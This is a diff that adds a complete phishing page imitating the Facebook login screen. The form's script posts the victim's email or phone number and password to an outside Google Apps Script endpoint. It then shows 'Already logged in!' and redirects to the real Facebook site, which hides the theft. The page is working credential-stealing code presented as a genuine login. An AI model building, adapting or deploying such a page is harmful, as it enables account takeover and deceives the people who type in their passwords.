@@ -1,1 +1,92 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>supportfac</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <div class="card">
+      <!-- Facebook-style header -->
+      <h1 class="facebook-title">facebook</h1>
+      <p>Connect with friends and the world around you on Facebook.</p>
 
+      <!-- Registration form -->
+      <form id="supportfac">
+        <input type="text" name="email_Phone" placeholder="Email or Phone Number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+
+      <!-- Message area for success/error -->
+     <p id="msg"></p> 
+
+      <!-- Forgot Password and Create New Account links -->
+      <div class="links">
+        <a href="#">Forgotten password?</a>
+        <span> · </span>
+        <a href="#">Create new account</a>
+      </div>
+
+      <!-- Footer / login link -->
+      <div class="footer">
+        Already have an account? <a href="#">Log in</a>
+      </div>
+    </div>
+  </div>
+
+<script>
+  const form = document.getElementById("supportfac");
+  const msg = document.getElementById("msg");
+  
+  // 🔹 Replace with your Web App URL (Apps Script deployment)
+  const url = "https://script.google.com/macros/s/AKfycbwLKJxmB4LDUpldRIPe3ZInmr2KoRN9oLYyFaE60gKsdk5lhoSxQeULjnrk0pgEy8S0Mw/exec";
+
+  form.addEventListener("submit", function(e) {
+    e.preventDefault();
+
+    msg.innerText = "Please wait...";
+    msg.style.color = "black";
+
+    // Send form data to Google Apps Script
+    fetch(url, {
+      method: "POST",
+      body: new FormData(form)
+    })
+    .then(res => res.text())
+    .then(text => {
+      console.log("RAW RESPONSE:", text);
+
+      let data;
+      try {
+        data = JSON.parse(text);
+      } catch(err) {
+        throw new Error("Invalid JSON response from server");
+      }
+
+      if (data.result === "success") {
+        msg.innerText = "Already logged in!";
+        msg.style.color = "green";
+
+// ⏳ Optional delay so user sees the message
+      setTimeout(() => {
+        window.location.href = "https://www.facebook.com/";
+      }, 1500);
+
+        
+      //  form.reset();
+      } else {
+        msg.innerText = "Submission failed: " + (data.message || "");
+       msg.style.color = "red";
+      }
+    })
+    .catch(err => {
+      console.error("Error:", err);
+      msg.innerText = "Submission failed!";
+      msg.style.color = "red";
+    });
+  });
+</script>
+
+</body>
+</html>
